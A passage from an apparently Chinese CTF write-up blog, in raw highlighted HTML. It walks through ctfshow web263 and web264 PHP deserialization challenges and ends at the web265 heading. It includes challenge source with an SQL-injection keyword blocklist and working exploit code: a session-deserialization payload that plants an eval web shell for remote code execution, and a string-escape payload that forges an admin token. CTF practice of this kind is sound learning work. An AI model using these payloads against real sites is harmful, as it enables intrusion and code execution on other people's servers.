class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&#x27;inc/inc.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$GET</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;u&quot;</span>=&gt;<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;u&#x27;</span>],<span class=\"string\">&quot;pass&quot;</span>=&gt;<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pass&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$GET</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"variable\">$data</span>= <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">get</span>(<span class=\"string\">&#x27;admin&#x27;</span>,</span><br><span class=\"line\">\t[\t<span class=\"string\">&#x27;id&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&#x27;UserName0&#x27;</span></span><br><span class=\"line\">\t],[</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;AND&quot;</span>=&gt;[</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;UserName0[=]&quot;</span>=&gt;<span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;u&#x27;</span>],</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PassWord1[=]&quot;</span>=&gt;<span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;pass&#x27;</span>] //密码必须为<span class=\"number\">128</span>位大小写字母+数字+特殊符号，防止爆破</span><br><span class=\"line\">\t\t]</span><br><span class=\"line\">\t]);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$data</span>[<span class=\"string\">&#x27;id&#x27;</span>])&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//登陆成功取消次数累计</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;limit&#x27;</span>]= <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">json_encode</span>(<span class=\"keyword\">array</span>(<span class=\"string\">&quot;success&quot;</span>,<span class=\"string\">&quot;msg&quot;</span>=&gt;<span class=\"string\">&quot;欢迎您&quot;</span>.<span class=\"variable\">$data</span>[<span class=\"string\">&#x27;UserName0&#x27;</span>]));</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//登陆失败累计次数加1</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;limit&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;limit&#x27;</span>])+<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">json_encode</span>(<span class=\"keyword\">array</span>(<span class=\"string\">&quot;error&quot;</span>,<span class=\"string\">&quot;msg&quot;</span>=&gt;<span class=\"string\">&quot;登陆失败&quot;</span>));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\tinc/inc.php：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;display_errors&#x27;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;session.serialize_handler&#x27;</span>, <span class=\"string\">&#x27;php&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">date_default_timezone_set</span>(<span class=\"string\">&quot;Asia/Shanghai&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">use</span> \\<span class=\"title\">CTFSHOW</span>\\<span class=\"title\">CTFSHOW</span>; </span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$db</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">CTFSHOW</span>([</span><br><span class=\"line\">    <span class=\"string\">&#x27;database_type&#x27;</span> =&gt; <span class=\"string\">&#x27;mysql&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;database_name&#x27;</span> =&gt; <span class=\"string\">&#x27;web&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;server&#x27;</span> =&gt; <span class=\"string\">&#x27;localhost&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;username&#x27;</span> =&gt; <span class=\"string\">&#x27;root&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;password&#x27;</span> =&gt; <span class=\"string\">&#x27;root&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;charset&#x27;</span> =&gt; <span class=\"string\">&#x27;utf8&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;port&#x27;</span> =&gt; <span class=\"number\">3306</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;prefix&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;option&#x27;</span> =&gt; [</span><br><span class=\"line\">        PDO::<span class=\"variable constant_\">ATTR_CASE</span> =&gt; PDO::<span class=\"variable constant_\">CASE_NATURAL</span></span><br><span class=\"line\">    ]</span><br><span class=\"line\">]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// sql注入检查</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkForm</span>(<span class=\"params\"><span class=\"variable\">$str</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$str</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\\`|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\\|\\&amp;|\\*|\\(|\\)|\\（|\\）|\\+|\\=|\\[|\\]|\\;|\\:|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\?/i&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$status</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setStatus</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;status=<span class=\"variable\">$s</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;log-&quot;</span>.<span class=\"variable\">$this</span>-&gt;username, <span class=\"string\">&quot;使用&quot;</span>.<span class=\"variable\">$this</span>-&gt;password.<span class=\"string\">&quot;登陆&quot;</span>.(<span class=\"variable\">$this</span>-&gt;status?<span class=\"string\">&quot;成功&quot;</span>:<span class=\"string\">&quot;失败&quot;</span>).<span class=\"string\">&quot;----&quot;</span>.<span class=\"title function_ invoke__\">date_create</span>()-&gt;<span class=\"title function_ invoke__\">format</span>(<span class=\"string\">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*生成唯一标志</span></span><br><span class=\"line\"><span class=\"comment\">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>  <span class=\"title\">uuid</span>(<span class=\"params\"></span>)  </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$chars</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">uniqid</span>(<span class=\"title function_ invoke__\">mt_rand</span>(), <span class=\"literal\">true</span>));  </span><br><span class=\"line\">    <span class=\"variable\">$uuid</span> = <span class=\"title function_ invoke__\">substr</span> ( <span class=\"variable\">$chars</span>, <span class=\"number\">0</span>, <span class=\"number\">8</span> ) . <span class=\"string\">&#x27;-&#x27;</span></span><br><span class=\"line\">            . <span class=\"title function_ invoke__\">substr</span> ( <span class=\"variable\">$chars</span>, <span class=\"number\">8</span>, <span class=\"number\">4</span> ) . <span class=\"string\">&#x27;-&#x27;</span> </span><br><span class=\"line\">            . <span class=\"title function_ invoke__\">substr</span> ( <span class=\"variable\">$chars</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span> ) . <span class=\"string\">&#x27;-&#x27;</span></span><br><span class=\"line\">            . <span class=\"title function_ invoke__\">substr</span> ( <span class=\"variable\">$chars</span>, <span class=\"number\">16</span>, <span class=\"number\">4</span> ) . <span class=\"string\">&#x27;-&#x27;</span></span><br><span class=\"line\">            . <span class=\"title function_ invoke__\">substr</span> ( <span class=\"variable\">$chars</span>, <span class=\"number\">20</span>, <span class=\"number\">12</span> );  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$uuid</span> ;  </span><br><span class=\"line\">&#125;  </span><br></pre></td></tr></table></figure>\n<p>​\t\t最后一个文件没啥用，又长，就不放了。</p>\n<p>​\t\t先看 inc/inc.php，里面存在 <code>ini_set('session.serialize_handler', 'php');</code> ，根据 user 类，发现可以写入文件，发现在魔术方法__destruct 中会把 password 写入 log-username 文件中，而这里的 username 和 password 可控，在 index.php 中会检查是否设置了 session，并且：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;log-&quot;</span>.<span class=\"variable\">$this</span>-&gt;username, <span class=\"string\">&quot;使用&quot;</span>.<span class=\"variable\">$this</span>-&gt;password.<span class=\"string\">&quot;登陆&quot;</span>.(<span class=\"variable\">$this</span>-&gt;status?<span class=\"string\">&quot;成功&quot;</span>:<span class=\"string\">&quot;失败&quot;</span>).<span class=\"string\">&quot;----&quot;</span>.<span class=\"title function_ invoke__\">date_create</span>()-&gt;<span class=\"title function_ invoke__\">format</span>(<span class=\"string\">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t因为 session.save_handler=&quot;&quot; 于 user.ini 默认设置不符，会反序列化 session 中 | 后的数据所以可以直接构造 payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;1.php&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&quot;|&quot;</span>.<span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">User</span>)));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#palyoad:fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNDoiPD9waHAgZXZhbCgkX1BPU1RbYV0pOz8%2BIjt9</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后访问 index.php，将 cookie 的 limit 参数改为生成的 base64 编码字符串，然后访问 check.php，最后访问 log-1.php 即可进行 rce。</p>\n<h1 id=\"web264\"><a class=\"markdownIt-Anchor\" href=\"#web264\">#</a> web264：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Author</span>: h1xa</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Last</span> Modified by:   h1xa</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@message</span>.php</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@email</span>: h1xa<span class=\"doctag\">@ctfer</span>.com</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@link</span>: https://ctfer.com</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">message</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$from</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$to</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>=<span class=\"string\">&#x27;user&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">from</span> = <span class=\"variable\">$f</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;msg = <span class=\"variable\">$m</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;to = <span class=\"variable\">$t</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$f</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;f&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$m</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;m&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$t</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;t&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$f</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$m</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$t</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">message</span>(<span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span>);</span><br><span class=\"line\">    <span class=\"variable\">$umsg</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;fuck&#x27;</span>, <span class=\"string\">&#x27;loveU&#x27;</span>, <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$msg</span>));</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;msg&#x27;</span>]=<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$umsg</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Your message has been sent&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<p>​\t\t和 262 一样，访问 message.php，然后代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">message</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$from</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$to</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>=<span class=\"string\">&#x27;user&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">from</span> = <span class=\"variable\">$f</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;msg = <span class=\"variable\">$m</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;to = <span class=\"variable\">$t</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;msg&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;msg&#x27;</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$msg</span>-&gt;token==<span class=\"string\">&#x27;admin&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里似乎不能修改 cookie 了，没办法了，直接打吧：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">message</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$from</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$to</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>=<span class=\"string\">&#x27;admin&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">from</span> = <span class=\"variable\">$f</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;msg = <span class=\"variable\">$m</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;to = <span class=\"variable\">$t</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">message</span>(<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$msg</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg_1</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;fuck&#x27;</span>, <span class=\"string\">&#x27;loveU&#x27;</span>, <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$msg</span>));</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$msg_1</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\tindex.php 用 get 传参 payload，之后访问 message.php，cookie 后面加一个；msg=1 即可。</p>\n<h1 id=\"web265\"><a class=\"markdownIt-Anchor\" href=\"#web265\">#</a> web265：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 